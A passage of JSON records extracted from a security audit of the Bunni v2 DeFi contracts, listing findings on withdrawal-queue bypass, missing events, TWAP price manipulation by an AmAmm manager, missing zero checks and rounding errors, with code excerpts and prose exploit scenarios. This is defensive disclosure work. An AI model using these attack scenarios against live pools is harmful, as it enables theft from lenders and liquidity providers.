Since the target ratio for the tokens is currently 1:1, we can assume they have the same price, and see that if each token was worth \\$1, Alice made an excess profit of \\$4.50, or just over 2% of the original total pool value.\n\n#### Recommendations\n\nShort term, add a check to enforce the withdrawal queue when rebalanceOrderDeadline is in the future.\n\nLong term, consider changing the add/remove liquidity flows to account for excess liquidity or adding checks to the rebalance hooks that enforce that the pool is in an improved state after the rebalance.\n", "severity": "High", "difficulty": "Low", "type": "Data Validation", "finding_id": "TOB-BUNNI-9", "target": {"path": "src/lib/BunniHookLogic.sol, src/lib/BunniHubLogic.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/timeless-fi/bunni-v2", "org": "timeless-fi", "name": "bunni-v2", "commit": "7faae4718eecda1b33dc3abd894431ed2d16c929", "branch": null, "relative_file": "src/lib/BunniHookLogic.sol, src/lib/BunniHubLogic.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-01-bacon-labs-bunniv2-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:21:00.930035+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:21:00.934897+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": "Low", "Type": "Data Validation", "Finding ID": "TOB-BUNNI-9", "Target": "src/lib/BunniHookLogic.sol, src/lib/BunniHubLogic.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2025-01-bacon-labs-bunniv2-securityreview-010", "doc_id": "trailofbits_2025-01-bacon-labs-bunniv2-securityreview", "finding_index": 10, "page_start": 44, "title": "Insucient event generation", "short_summary": null, "description_md": "#### Description\n\nMultiple operations do not emit events. As a result, it will be difficult to review the contracts' behavior for correctness once they have been deployed.\n\nEvents generated during contract execution aid in monitoring, baselining of behavior, and detection of suspicious activity. Without events, users and blockchain-monitoring systems cannot easily detect behavior that falls outside the baseline conditions; malfunctioning contracts and attacks could go undetected.\n\nThe following operations should trigger events:\n\n- claimReferralRewards ([bunni-v2/src/BunniTokens.sol#L155-L196](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/BunniToken.sol#L155-L196))\n- distributeReferralRewards ([bunni-v2/src/BunniTokens.sol#L132-L152](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/BunniToken.sol#L132-L152))\n- claimProtocolFees ([bunni-v2/src/BunniHook.sol#L244-L246](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/BunniHook.sol#L244-L246))\n- rebalanceOrderPreHook ([bunni-v2/src/BunniHook.sol#L429-L462](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/BunniHook.sol#L429-L462))\n- rebalanceOrderPostHook ([bunni-v2/src/BunniHook.sol#L465-L511](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/BunniHook.sol#L465-L511))\n- \\_rebalance ([bunni-v2/src/lib/BunniHookLogic.sol#L532-L550](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniHookLogic.sol#L532-L550))\n- updateStateMachine ([biddog/src/AmAmm.sol#L432-L434](https://github.com/Bunniapp/biddog/blob/95f4270ad4447e96044973580afda9176730e7c8/src/AmAmm.sol#L432-L434))\n", "full_markdown": "| 10. Insucient event generation                               |                        |\n|-----------------------------------------------------------------------|------------------------|\n| Severity: Informational                                            | Diffi culty: Low |\n| Type: Auditing and Logging Finding ID: TOB-BUNNI-10 |                        |\n| Target: bunni-v2/src/*, biddog/src/AmAmm.sol                    |                        |\n\n#### Description\n\nMultiple operations do not emit events. As a result, it will be difficult to review the contracts' behavior for correctness once they have been deployed.\n\nEvents generated during contract execution aid in monitoring, baselining of behavior, and detection of suspicious activity. Without events, users and blockchain-monitoring systems cannot easily detect behavior that falls outside the baseline conditions; malfunctioning contracts and attacks could go undetected.\n\nThe following operations should trigger events:\n\n- claimReferralRewards ([bunni-v2/src/BunniTokens.sol#L155-L196](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/BunniToken.sol#L155-L196))\n- distributeReferralRewards ([bunni-v2/src/BunniTokens.sol#L132-L152](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/BunniToken.sol#L132-L152))\n- claimProtocolFees ([bunni-v2/src/BunniHook.sol#L244-L246](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/BunniHook.sol#L244-L246))\n- rebalanceOrderPreHook ([bunni-v2/src/BunniHook.sol#L429-L462](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/BunniHook.sol#L429-L462))\n- rebalanceOrderPostHook ([bunni-v2/src/BunniHook.sol#L465-L511](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/BunniHook.sol#L465-L511))\n- \\_rebalance ([bunni-v2/src/lib/BunniHookLogic.sol#L532-L550](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniHookLogic.sol#L532-L550))\n- updateStateMachine ([biddog/src/AmAmm.sol#L432-L434](https://github.com/Bunniapp/biddog/blob/95f4270ad4447e96044973580afda9176730e7c8/src/AmAmm.sol#L432-L434))\n\n#### Recommendations\n\nShort term, add events for all operations that could contribute to a higher level of monitoring and alerting.\n\nLong term, consider using a blockchain-monitoring system to track any suspicious behavior in the contracts. The system relies on several contracts to behave as expected. A monitoring mechanism for critical events would quickly detect any compromised system components.\n", "severity": "Informational", "difficulty": "Low", "type": "Auditing and Logging", "finding_id": "TOB-BUNNI-10", "target": {"path": "bunni-v2/src/*, biddog/src/AmAmm.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/Bunniapp/biddog", "org": "Bunniapp", "name": "biddog", "commit": "95f4270ad4447e96044973580afda9176730e7c8", "branch": null, "relative_file": "bunni-v2/src/*, biddog/src/AmAmm.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-01-bacon-labs-bunniv2-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:21:00.930035+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:21:00.934897+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "Low", "Type": "Auditing and Logging", "Finding ID": "TOB-BUNNI-10", "Target": "bunni-v2/src/*, biddog/src/AmAmm.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2025-01-bacon-labs-bunniv2-securityreview-011", "doc_id": "trailofbits_2025-01-bacon-labs-bunniv2-securityreview", "finding_index": 11, "page_start": 45, "title": "AmAmm manager can manipulate TWAP prices without risk", "short_summary": null, "description_md": "#### Description\n\nThe AmAmm manager of a pool can manipulate the TWAP price of the pool by swapping a large amount of assets and then setting the swap fee to a very high value in order to prevent others from arbitraging the pool.\n\nThe AmAmm manager of a pool can set the swap fees of this pool by calling the setBidPayload function of the AmAmm contract, as shown in figure 11.1:\n\n```\nfunction setBidPayload(PoolId id, bytes7 payload, bool topBid) external virtual\noverride {\n address msgSender = LibMulticaller.senderOrSigner();\n if (!_amAmmEnabled(id)) {\n revert AmAmm__NotEnabled();\n }\n // update state machine\n _updateAmAmmWrite(id);\n Bid storage relevantBid = topBid ? _topBids[id] : _nextBids[id];\n if (msgSender != relevantBid.manager) {\n revert AmAmm__Unauthorized();\n }\n if (!_payloadIsValid(id, payload)) {\n revert AmAmm__InvalidBid();\n }\n relevantBid.payload = payload;\n emit SetBidPayload(id, msgSender, payload, topBid);\n}\n```\n\n*Figure 11.1: Function to set the payload used for this pool ([biddog/src/AmAmm.sol#L406–L429](https://github.com/Bunniapp/biddog/blob/95f4270ad4447e96044973580afda9176730e7c8/src/AmAmm.sol#L406-L429))*\n\nThe payload they set contains the swap fee parameter for each direction of the swap and a Boolean flag that determines if the pool will charge surge fees, as shown in figure 11.2:\n\n\n```\nfunction decodeAmAmmPayload(bytes7 payload)\n pure\n returns (uint24 swapFee0For1, uint24 swapFee1For0, bool enableSurgeFee)\n{\n swapFee0For1 = uint24(bytes3(payload));\n swapFee1For0 = uint24(bytes3(payload << 24));\n enableSurgeFee = uint8(payload[6]) != 0;\n}\n```\n\n*Figure 11.2: The parameters contained in the AmAmm payload ([src/lib/AmAmmPayload.sol#L11–L18](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/AmAmmPayload.sol#L11-L18))*\n\nOnce a swap is initiated and the beforeSwap function of the BunniHook contract is called, the function will determine the swap fees charged based on the bid payload of the current manager (if a manager is set), as shown in figure 11.3:\n\n```\n// update am-AMM state\nuint24 amAmmSwapFee;\nbool amAmmEnableSurgeFee;\nif (hookParams.amAmmEnabled) {\n bytes7 payload;\n IAmAmm.Bid memory topBid = IAmAmm(address(this)).getTopBidWrite(id);\n (amAmmManager, payload) = (topBid.manager, topBid.payload);\n uint24 swapFee0For1;\n uint24 swapFee1For0;\n (swapFee0For1, swapFee1For0, amAmmEnableSurgeFee) = decodeAmAmmPayload(payload);\n amAmmSwapFee = params.zeroForOne ? swapFee0For1 : swapFee1For0;\n}\n```\n\n*Figure 11.3: A code snippet of the beforeSwap function ([src/lib/BunniHookLogic.sol#L295–L305](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniHookLogic.sol#L295-L305))*\n\nHowever, a malicious AmAmm manager could use this mechanism to protect themselves from arbitrage while they are manipulating the TWAP price. It is important to note that the BunniHook defines a maximum swap fee that can be used; however, this value could be misconfigured or naively set to a high value. Additionally, the use of a truncated Oracle makes this manipulation take longer since the TWAP price will gradually update over several blocks.\n", "full_markdown": "# 11. AmAmm manager can manipulate TWAP prices without risk Severity: **Medium** Difficulty: **High** Type: Access Controls Finding ID: TOB-BUNNI-11 Target: biddog/src/AmAmm.sol\n\n#### Description\n\nThe AmAmm manager of a pool can manipulate the TWAP price of the pool by swapping a large amount of assets and then setting the swap fee to a very high value in order to prevent others from arbitraging the pool.\n\nThe AmAmm manager of a pool can set the swap fees of this pool by calling the setBidPayload function of the AmAmm contract, as shown in figure 11.1:\n\n```\nfunction setBidPayload(PoolId id, bytes7 payload, bool topBid) external virtual\noverride {\n address msgSender = LibMulticaller.senderOrSigner();\n if (!_amAmmEnabled(id)) {\n revert AmAmm__NotEnabled();\n }\n // update state machine\n _updateAmAmmWrite(id);\n Bid storage relevantBid = topBid ? _topBids[id] : _nextBids[id];\n if (msgSender != relevantBid.manager) {\n revert AmAmm__Unauthorized();\n }\n if (!_payloadIsValid(id, payload)) {\n revert AmAmm__InvalidBid();\n }\n relevantBid.payload = payload;\n emit SetBidPayload(id, msgSender, payload, topBid);\n}\n```\n\n*Figure 11.1: Function to set the payload used for this pool ([biddog/src/AmAmm.sol#L406–L429](https://github.com/Bunniapp/biddog/blob/95f4270ad4447e96044973580afda9176730e7c8/src/AmAmm.sol#L406-L429))*\n\nThe payload they set contains the swap fee parameter for each direction of the swap and a Boolean flag that determines if the pool will charge surge fees, as shown in figure 11.2:\n\n\n```\nfunction decodeAmAmmPayload(bytes7 payload)\n pure\n returns (uint24 swapFee0For1, uint24 swapFee1For0, bool enableSurgeFee)\n{\n swapFee0For1 = uint24(bytes3(payload));\n swapFee1For0 = uint24(bytes3(payload << 24));\n enableSurgeFee = uint8(payload[6]) != 0;\n}\n```\n\n*Figure 11.2: The parameters contained in the AmAmm payload ([src/lib/AmAmmPayload.sol#L11–L18](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/AmAmmPayload.sol#L11-L18))*\n\nOnce a swap is initiated and the beforeSwap function of the BunniHook contract is called, the function will determine the swap fees charged based on the bid payload of the current manager (if a manager is set), as shown in figure 11.3:\n\n```\n// update am-AMM state\nuint24 amAmmSwapFee;\nbool amAmmEnableSurgeFee;\nif (hookParams.amAmmEnabled) {\n bytes7 payload;\n IAmAmm.Bid memory topBid = IAmAmm(address(this)).getTopBidWrite(id);\n (amAmmManager, payload) = (topBid.manager, topBid.payload);\n uint24 swapFee0For1;\n uint24 swapFee1For0;\n (swapFee0For1, swapFee1For0, amAmmEnableSurgeFee) = decodeAmAmmPayload(payload);\n amAmmSwapFee = params.zeroForOne ? swapFee0For1 : swapFee1For0;\n}\n```\n\n*Figure 11.3: A code snippet of the beforeSwap function ([src/lib/BunniHookLogic.sol#L295–L305](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniHookLogic.sol#L295-L305))*\n\nHowever, a malicious AmAmm manager could use this mechanism to protect themselves from arbitrage while they are manipulating the TWAP price. It is important to note that the BunniHook defines a maximum swap fee that can be used; however, this value could be misconfigured or naively set to a high value. Additionally, the use of a truncated Oracle makes this manipulation take longer since the TWAP price will gradually update over several blocks.\n\n#### Exploit Scenario\n\nAlice deploys a pool with a BunniHook that has 100% as the maximum swap fee. Her pool's TWAP price is used in an external lending protocol to determine asset prices. Eve creates a large bid and becomes the AmAmm manager of this pool. She then proceeds to borrow a large amount of assets to manipulate the TWAP price over several blocks and sets the swap fees to 100% to protect her manipulation against arbitrage. Eve drains the lending pool that overvalued her assets due to the inflated TWAP price.\n\n\n\n#### Recommendations\n\nShort term, consider determining and setting a reasonable max swap fee upper bound in the BunniHook contract.\n\nLong term, create developer- and user-facing documentation that clearly outlines the risks of different pool and hook configurations, as well as the powers of the AmAmm manager.\n", "severity": "Medium", "difficulty": "High", "type": "Access Controls", "finding_id": "TOB-BUNNI-11", "target": {"path": "biddog/src/AmAmm.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/Bunniapp/biddog", "org": "Bunniapp", "name": "biddog", "commit": "95f4270ad4447e96044973580afda9176730e7c8", "branch": null, "relative_file": "biddog/src/AmAmm.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-01-bacon-labs-bunniv2-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:21:00.930035+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:21:00.934897+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": "High", "Type": "Access Controls", "Finding ID": "TOB-BUNNI-11", "Target": "biddog/src/AmAmm.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2025-01-bacon-labs-bunniv2-securityreview-012", "doc_id": "trailofbits_2025-01-bacon-labs-bunniv2-securityreview", "finding_index": 12, "page_start": 48, "title": "Lack of zero-value checks", "short_summary": null, "description_md": "#### Description\n\nCertain functions fail to validate incoming arguments, so callers of these functions could mistakenly set important state variables to a zero value, misconfiguring the system.\n\nFor example, the constructor in the BunniHub contract sets the poolManager, weth, and bunniTokenImplementation variables, which store the addresses of external contracts Bunni v2 relies on:\n\n```\nconstructor(\n IPoolManager poolManager_,\n WETH weth_,\n IPermit2 permit2_,\n IBunniToken bunniTokenImplementation_,\n address initialOwner\n) Permit2Enabled(permit2_) {\n poolManager = poolManager_;\n weth = weth_;\n bunniTokenImplementation = bunniTokenImplementation_;\n _initializeOwner(initialOwner);\n}\n```\n\n*Figure 12.1: The constructor of the BunniHub contract ([src/BunniHub.sol#L75–L86](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/BunniHub.sol#L75-L86))*\n\nIf weth is set to a zero value, this deployment of the Bunni v2 protocol would be unable to handle native ether. Since all of the variables mentioned above are tagged as immutable, the contract will have to be redeployed to update to the correct address. This misconfiguration may not be noticed immediately, and forcing LPs to migrate would create a poor user experience.\n\nThe following functions are missing zero-value checks:\n\n- BunniHook.constructor\n- The inputAmount returned by the call to BunniSwapMath.computeSwap in BunnyHookLogic.beforeSwap for an exactOut swap\n", "full_markdown": "| 12. Lack of zero-value checks                            |                                |\n|----------------------------------------------------------------------|--------------------------------|\n| Severity: Informational                                           | Diffi culty: Low         |\n| Type: Data Validation                                          | Finding ID: TOB-BUNNI-12 |\n| Target: src/BunniHub, src/BunniHook, src/lib/BunniHookLogic |                                |\n\n#### Description\n\nCertain functions fail to validate incoming arguments, so callers of these functions could mistakenly set important state variables to a zero value, misconfiguring the system.\n\nFor example, the constructor in the BunniHub contract sets the poolManager, weth, and bunniTokenImplementation variables, which store the addresses of external contracts Bunni v2 relies on:\n\n```\nconstructor(\n IPoolManager poolManager_,\n WETH weth_,\n IPermit2 permit2_,\n IBunniToken bunniTokenImplementation_,\n address initialOwner\n) Permit2Enabled(permit2_) {\n poolManager = poolManager_;\n weth = weth_;\n bunniTokenImplementation = bunniTokenImplementation_;\n _initializeOwner(initialOwner);\n}\n```\n\n*Figure 12.1: The constructor of the BunniHub contract ([src/BunniHub.sol#L75–L86](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/BunniHub.sol#L75-L86))*\n\nIf weth is set to a zero value, this deployment of the Bunni v2 protocol would be unable to handle native ether. Since all of the variables mentioned above are tagged as immutable, the contract will have to be redeployed to update to the correct address. This misconfiguration may not be noticed immediately, and forcing LPs to migrate would create a poor user experience.\n\nThe following functions are missing zero-value checks:\n\n- BunniHook.constructor\n- The inputAmount returned by the call to BunniSwapMath.computeSwap in BunnyHookLogic.beforeSwap for an exactOut swap\n\n\n\n#### Recommendations\n\nShort term, add zero-value checks to all function arguments to ensure that callers cannot set incorrect values, misconfiguring the system.\n\nLong term, use the Slither static [analyzer](https://github.com/crytic/slither) to catch common issues such as this one. Consider integrating a Slither scan into the project's CI pipeline, pre-commit hooks, or build scripts.\n", "severity": "Informational", "difficulty": "Low", "type": "Data Validation", "finding_id": "TOB-BUNNI-12", "target": {"path": "src/BunniHub, src/BunniHook, src/lib/BunniHookLogic", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/crytic/slither", "org": "crytic", "name": "slither", "commit": null, "branch": null, "relative_file": "src/BunniHub, src/BunniHook, src/lib/BunniHookLogic", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-01-bacon-labs-bunniv2-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:21:00.930035+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:21:00.934897+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "Low", "Type": "Data Validation", "Finding ID": "TOB-BUNNI-12", "Target": "src/BunniHub, src/BunniHook, src/lib/BunniHookLogic"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2025-01-bacon-labs-bunniv2-securityreview-013", "doc_id": "trailofbits_2025-01-bacon-labs-bunniv2-securityreview", "finding_index": 13, "page_start": 50, "title": "Lack of systematic approach to rounding and arithmetic errors", "short_summary": null, "description_md": "#### Description\n\nWhile reviewing the codebase, we noted several areas with seemingly excessive input validation that may hint at underlying issues stemming from improper rounding directions or other arithmetic errors. While we did not identify root causes or ways to exploit these instances, they warrant further investigation and testing. If the root cause is determined to be truly benign, it should be documented.\n\nOperations that suggest a lack of a systematic approach to rounding and arithmetic errors include the following:\n\n● The computeSwap function of the BunniSwapMath library computes the outputAmount multiple times, which indicates that there is a rounding or arithmetic error that is improperly handled:\n\n```\n// compute first pass result\n(updatedSqrtPriceX96, updatedTick, inputAmount, outputAmount) = _computeSwap(input,\namountSpecified);\n// ensure that the output amount is lte the output token balance\nif (outputAmount > outputTokenBalance) {\n // exactly output the output token's balance\n // need to recompute swap\n amountSpecified = outputTokenBalance.toInt256();\n (updatedSqrtPriceX96, updatedTick, inputAmount, outputAmount) =\n_computeSwap(input, amountSpecified);\n if (outputAmount > outputTokenBalance) {\n // somehow the output amount is still greater than the balance due to\nrounding errors\n // just set outputAmount to the balance\n outputAmount = outputTokenBalance;\n }\n}\n```\n\n*Figure 13.1: A snippet of the computeSwap function that may result in two trial swaps before a cap is applied to outputAmount ([src/lib/BunniSwapMath.sol#L62–L77](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniSwapMath.sol#L62-L77))*\n\n\n● The \\_computeSwap function of the BunniSwapMath library allows a user to get up to 2 wei of tokens for free:\n\n```\nif (exactIn) {\n uint256 inputAmountSpecified = uint256(-amountSpecified);\n if (inputAmount > inputAmountSpecified && inputAmount < inputAmountSpecified +\n3) {\n // if it's an exact input swap and inputAmount is greater than the specified\ninput amount by 1 or 2 wei,\n // round down to the specified input amount to avoid reverts. this assumes\nthat it's not feasible to\n // extract significant value from the pool if each swap can at most extract\n2 wei.\n inputAmount = inputAmountSpecified;\n }\n}\n```\n\n*Figure 13.2: A snippet of the \\_computeSwap function that shows the input amount being rounded down in certain situations, favoring the user instead of the pool ([src/lib/BunniSwapMath.sol#L336–L344](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniSwapMath.sol#L336-L344))*\n\n● The \\_computeRebalanceParams function of the BunniHookLogic library has a case where both tokens have excess liquidity. This indicates a rounding or arithmetic error in the way excess liquidity is computed:\n\n```\n// decide which token will be rebalanced (i.e., sold into the other token)\nbool willRebalanceToken0 = shouldRebalance0 && (!shouldRebalance1 ||\nexcessLiquidity0 > excessLiquidity1);\n```\n\n*Figure 13.3: A snippet of the \\_computeRebalanceParams function ([src/lib/BunniHookLogic.sol#L651–L652](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniHookLogic.sol#L651-L652))*\n\n● The token densities in the queryLDF function are rounded down. However, the density is later used as a denominator, which can result in the totalLiquidityEstimates rounding up. The getAmountsForLiquidity function always rounds down throughout the codebase, which may be incorrect in some cases, as shown in figure 13.4:\n\n```\n(uint256 density0OfRoundedTickX96, uint256 density1OfRoundedTickX96) =\nLiquidityAmounts.getAmountsForLiquidity(\n sqrtPriceX96, roundedTickSqrtRatio, nextRoundedTickSqrtRatio,\nuint128(liquidityDensityOfRoundedTickX96), false\n);\ntotalDensity0X96 = density0RightOfRoundedTickX96 + density0OfRoundedTickX96;\ntotalDensity1X96 = density1LeftOfRoundedTickX96 + density1OfRoundedTickX96;\nuint256 totalLiquidityEstimate0 =\n (balance0 == 0 || totalDensity0X96 == 0) ? 0 : balance0.fullMulDiv(Q96,\ntotalDensity0X96);\n```\n\n\n```\nuint256 totalLiquidityEstimate1 =\n (balance1 == 0 || totalDensity1X96 == 0) ? 0 : balance1.fullMulDiv(Q96,\ntotalDensity1X96);\n```\n\n*Figure 13.4: A snippet of the queryLDF function ([src/lib/QueryLDF.sol#L69–L77](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/QueryLDF.sol#L69-L77))*\n\n● If the cumulativeAmounts0/cumulativeAmounts1 functions round down, the resulting excess liquidity is rounded up since the cumulative amounts are used as the denominator:\n\n```\nuint256 excessLiquidity0 = balance0 > currentActiveBalance0\n ? (balance0 - currentActiveBalance0).divWad(\n bunniState.liquidityDensityFunction.cumulativeAmount0(\n input.key,\n minUsableTick,\n WAD,\n input.arithmeticMeanTick,\n input.updatedTick,\n bunniState.ldfParams,\n input.newLdfState\n )\n )\n : 0;\nuint256 excessLiquidity1 = balance1 > currentActiveBalance1\n ? (balance1 - currentActiveBalance1).divWad(\n bunniState.liquidityDensityFunction.cumulativeAmount1(\n input.key,\n maxUsableTick,\n WAD,\n input.arithmeticMeanTick,\n input.updatedTick,\n bunniState.ldfParams,\n input.newLdfState\n )\n )\n : 0;\n```\n\n*Figure 13.5: A snippet of the \\_computeRebalanceParams function ([src/lib/BunniHookLogic.sol#L591–L616](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniHookLogic.sol#L591-L616))*\n", "full_markdown": "| 13. Lack of systematic approach to rounding and arithmetic errors |                                |  |\n|----------------------------------------------------------------------------------------------|--------------------------------|--|\n| Severity: Undetermined                                                                    | Diffi culty: Low         |  |\n| Type: Data Validation                                                                  | Finding ID: TOB-BUNNI-13 |  |\n| Target: bunni-v2/src/*                                                                    |                                |  |\n\n#### Description\n\nWhile reviewing the codebase, we noted several areas with seemingly excessive input validation that may hint at underlying issues stemming from improper rounding directions or other arithmetic errors. While we did not identify root causes or ways to exploit these instances, they warrant further investigation and testing. If the root cause is determined to be truly benign, it should be documented.\n\nOperations that suggest a lack of a systematic approach to rounding and arithmetic errors include the following:\n\n● The computeSwap function of the BunniSwapMath library computes the outputAmount multiple times, which indicates that there is a rounding or arithmetic error that is improperly handled:\n\n```\n// compute first pass result\n(updatedSqrtPriceX96, updatedTick, inputAmount, outputAmount) = _computeSwap(input,\namountSpecified);\n// ensure that the output amount is lte the output token balance\nif (outputAmount > outputTokenBalance) {\n // exactly output the output token's balance\n // need to recompute swap\n amountSpecified = outputTokenBalance.toInt256();\n (updatedSqrtPriceX96, updatedTick, inputAmount, outputAmount) =\n_computeSwap(input, amountSpecified);\n if (outputAmount > outputTokenBalance) {\n // somehow the output amount is still greater than the balance due to\nrounding errors\n // just set outputAmount to the balance\n outputAmount = outputTokenBalance;\n }\n}\n```\n\n*Figure 13.1: A snippet of the computeSwap function that may result in two trial swaps before a cap is applied to outputAmount ([src/lib/BunniSwapMath.sol#L62–L77](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniSwapMath.sol#L62-L77))*\n\n\n● The \\_computeSwap function of the BunniSwapMath library allows a user to get up to 2 wei of tokens for free:\n\n```\nif (exactIn) {\n uint256 inputAmountSpecified = uint256(-amountSpecified);\n if (inputAmount > inputAmountSpecified && inputAmount < inputAmountSpecified +\n3) {\n // if it's an exact input swap and inputAmount is greater than the specified\ninput amount by 1 or 2 wei,\n // round down to the specified input amount to avoid reverts. this assumes\nthat it's not feasible to\n // extract significant value from the pool if each swap can at most extract\n2 wei.\n inputAmount = inputAmountSpecified;\n }\n}\n```\n\n*Figure 13.2: A snippet of the \\_computeSwap function that shows the input amount being rounded down in certain situations, favoring the user instead of the pool ([src/lib/BunniSwapMath.sol#L336–L344](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniSwapMath.sol#L336-L344))*\n\n● The \\_computeRebalanceParams function of the BunniHookLogic library has a case where both tokens have excess liquidity. This indicates a rounding or arithmetic error in the way excess liquidity is computed:\n\n```\n// decide which token will be rebalanced (i.e., sold into the other token)\nbool willRebalanceToken0 = shouldRebalance0 && (!shouldRebalance1 ||\nexcessLiquidity0 > excessLiquidity1);\n```\n\n*Figure 13.3: A snippet of the \\_computeRebalanceParams function ([src/lib/BunniHookLogic.sol#L651–L652](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniHookLogic.sol#L651-L652))*\n\n● The token densities in the queryLDF function are rounded down. However, the density is later used as a denominator, which can result in the totalLiquidityEstimates rounding up. The getAmountsForLiquidity function always rounds down throughout the codebase, which may be incorrect in some cases, as shown in figure 13.4:\n\n```\n(uint256 density0OfRoundedTickX96, uint256 density1OfRoundedTickX96) =\nLiquidityAmounts.getAmountsForLiquidity(\n sqrtPriceX96, roundedTickSqrtRatio, nextRoundedTickSqrtRatio,\nuint128(liquidityDensityOfRoundedTickX96), false\n);\ntotalDensity0X96 = density0RightOfRoundedTickX96 + density0OfRoundedTickX96;\ntotalDensity1X96 = density1LeftOfRoundedTickX96 + density1OfRoundedTickX96;\nuint256 totalLiquidityEstimate0 =\n (balance0 == 0 || totalDensity0X96 == 0) ? 0 : balance0.fullMulDiv(Q96,\ntotalDensity0X96);\n```\n\n\n```\nuint256 totalLiquidityEstimate1 =\n (balance1 == 0 || totalDensity1X96 == 0) ? 0 : balance1.fullMulDiv(Q96,\ntotalDensity1X96);\n```\n\n*Figure 13.4: A snippet of the queryLDF function 